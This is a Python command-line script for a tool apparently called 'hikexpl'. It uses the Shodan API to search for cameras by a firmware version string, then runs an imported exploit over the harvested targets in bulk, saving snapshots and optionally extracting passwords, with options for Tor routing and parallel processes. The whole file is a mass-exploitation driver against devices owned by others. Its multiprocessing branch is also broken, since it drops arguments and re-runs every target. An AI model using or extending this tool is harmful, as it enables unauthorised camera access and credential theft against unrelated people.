import logging
from multiprocessing import Pool

import typer
from rich.console import Console
from hikexpl.hik import exploit as exploit_hik
from hikexpl.utils import split_list
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("hikexpl")
logger.setLevel(logging.INFO)
app = typer.Typer()
__version__ = "0.1.0"

DEFAULT_DORK = "3.1.3.150324"
@app.command()
def version():
    console = Console()
    console.print("[bold green]hikexpl[/bold green]")
    console.print(f"[cyan]Version:[/cyan] {__version__}")

@app.command()
def scan(token: str = typer.Option(..., help="Shodan API token"),
         dork: str = typer.Option(DEFAULT_DORK, help="Shodan dork"),
         pages: int = typer.Option(2, help="Number of pages to scan"),
         output: str = typer.Option("targets.txt", help="Output file")):
    logger.info(f"Scanning {dork} with {pages} pages")
    from scan import scan as shodan_scan
    urls = shodan_scan(token, dork, pages)
    with open(output, "w") as f:
        f.writelines([f"{url}\n" for url in urls])
    logging.info(f"Saved {len(urls)} targets to {output},\nUse 'exploit' command to exploit them")
@app.command()
def exploit(file: str = typer.Option(..., help="File with targets"),
            take_snapshots: bool = typer.Option(True, help="Take snapshots"),
            extract_passwords: bool = typer.Option(False, help="Extract passwords"),
            passwords_file: str = typer.Option("passwords.csv", help="Output file for passwords"),
            snapshots_folder: str = typer.Option(".", help="Folder to save snapshots"),
            use_tor: bool = typer.Option(False, help="Use Tor for requests -- NOT AVAILABLE YET IN PYTHON 3.12"),
            reuse_session: bool = typer.Option(True, help="Reuse session for requests"),
            process_count: int = typer.Option(1, help="Number of processes to use")
            ):
    logger.info(f"Reading {file}")

    with open(file, "r") as f:
        targets = f.readlines()
    targets = [target.strip() for target in targets]

    if process_count > 1:
        sub_lists = split_list(targets, process_count)
        with Pool(process_count) as p:
            p.map(exploit_hik, sub_lists)
    exploit_hik(targets,take_snapshots, extract_passwords, passwords_file ,snapshots_folder, use_tor, reuse_session)

if __name__ == "__main__":
    app()